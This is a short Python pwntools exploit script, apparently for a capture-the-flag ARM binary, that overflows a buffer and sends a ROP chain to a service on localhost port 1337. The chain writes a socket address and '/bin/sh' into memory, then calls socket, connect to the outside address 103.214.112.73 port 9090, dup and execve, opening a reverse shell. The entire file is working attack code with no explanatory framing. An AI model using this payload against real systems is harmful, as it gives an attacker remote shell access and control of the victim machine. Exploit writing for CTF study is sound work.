#!/usr/bin/env python3
from pwn import *

# r = process(["qemu-arm-static", "-g", "1234", "../src/main"])
r = remote("localhost", 1337)

r.recvline(0)

# 0x0003f6b4 : pop {r0, r8, ip, lr, pc}
# 0x0001a37c (0x0001a37d): str r3, [r4]; pop {r4, pc};
# 0x00014c28 (0x00014c29): pop {r3, pc};
# 0x00044176 (0x00044177): pop {r3, r4, pc};
# 0x00010a64 (0x00010a65): svc #0; pop {r7, pc};
# 0x00038766 (0x00038767): svc #0; pop {r7}; bx lr;
# 0x00026110 (0x00026111): pop {r0, r1, r2, r3, r7, pc};
# 0x00049bca (0x00049bcb): pop {pc};

def write_str(addr, data):
	data = data.ljust(4, b"\x00")
	payload = p32(0x00044177)
	payload += data[0:4]
	payload += p32(addr)
	for i in range(4, len(data), 4):
		payload += p32(0x0001a37d)
		payload += p32(addr + i)
		payload += p32(0x00014c29)
		payload += data[i:i+4].ljust(4, b"\x00")
	payload += p32(0x0001a37d)
	payload += p32(0)
	return payload

def syscall(r0, r1, r2, r7):
	payload = p32(0x0003f6b4) # r0, r8, ip, lr, pc
	payload += p32(0)
	payload += p32(0)
	payload += p32(0)
	payload += p32(0x00049bcb)
	payload += p32(0x00026111) # r0, r1, r2, r3, r7, pc
	payload += p32(r0)
	payload += p32(r1)
	payload += p32(r2)
	payload += p32(0)
	payload += p32(r7)
	payload += p32(0x00038767)
	payload += p32(0)
	return payload

payload = b"A" * 0x24
payload += write_str(0x74b00, b"\x02\x00#\x82g\xd6pI")
payload += write_str(0x74b10, b"/bin/sh\x00")
payload += syscall(2, 1, 0, r7=0x119) # socket(AF_INET, SOCK_STREAM, 0)
payload += syscall(0, 0x74b00, 0x10, r7=0x11b) # connect("103.214.112.73", 9090)
payload += syscall(0, 0, 0, r7=0x29) # dup(0)
payload += syscall(0, 0, 0, r7=0x29) # dup(0)
payload += syscall(0x74b10, 0, 0, r7=0xb) # execve("/bin/sh", 0, 0)

r.sendline(payload)

r.interactive()